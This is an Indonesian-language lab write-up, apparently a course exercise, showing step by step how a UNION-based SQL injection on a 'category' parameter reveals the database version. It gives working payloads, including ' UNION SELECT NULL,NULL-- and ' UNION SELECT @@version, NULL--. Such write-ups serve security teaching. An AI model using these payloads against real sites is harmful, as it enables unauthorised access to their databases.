# Soal Mandiri 4 
SQL Injection Attack – Querying the Database Type and Version (MySQL & Microsoft)
1. Challenge Overview

Tujuan lab ini adalah memanfaatkan celah SQL Injection untuk mengekstrak informasi tipe dan versi database pada target yang menggunakan MySQL atau Microsoft SQL Server.

2. Tools Used

Burp Suite: Proxy & Repeater untuk intercept dan modifikasi request.

Browser: untuk memverifikasi hasil di aplikasi web.

SQL payloads: UNION SELECT + fungsi @@version.

3. Step-by-Step Solution
Step 1: Identifikasi Parameter Rentan

Endpoint rentan ditemukan pada parameter kategori:

GET /filter?category=Pets


Input ' pada parameter category menghasilkan error → menandakan SQL Injection.

Step 2: Menentukan Jumlah Kolom

Dengan percobaan UNION SELECT menggunakan NULL beberapa kali, ditemukan jumlah kolom yang valid adalah 2.

Contoh percobaan:

' UNION SELECT NULL,NULL--

<img width="975" height="516" alt="image" src="https://github.com/user-attachments/assets/93b5df3e-36b3-47b9-9811-66a8041eca14" />

Step 3: Eksploitasi untuk Query Versi DB

Setelah tahu jumlah kolom, payload difokuskan untuk menampilkan versi DB.

Payload awal uji coba:

' UNION SELECT 'abc','def'--

<img width="975" height="515" alt="image" src="https://github.com/user-attachments/assets/f1c250a2-9372-4b09-84be-3269ec1c7902" />

Payload final:

' UNION SELECT @@version, NULL--

<img width="975" height="516" alt="image" src="https://github.com/user-attachments/assets/c018939f-9135-42d8-8a2c-d5571286f445" />

Step 4: Hasil
<img width="975" height="492" alt="image" src="https://github.com/user-attachments/assets/bfba3e10-a255-4f44-b536-e8d234585e28" />

Response menampilkan hasil query:

9.0.1+deb10u0-0.04.1
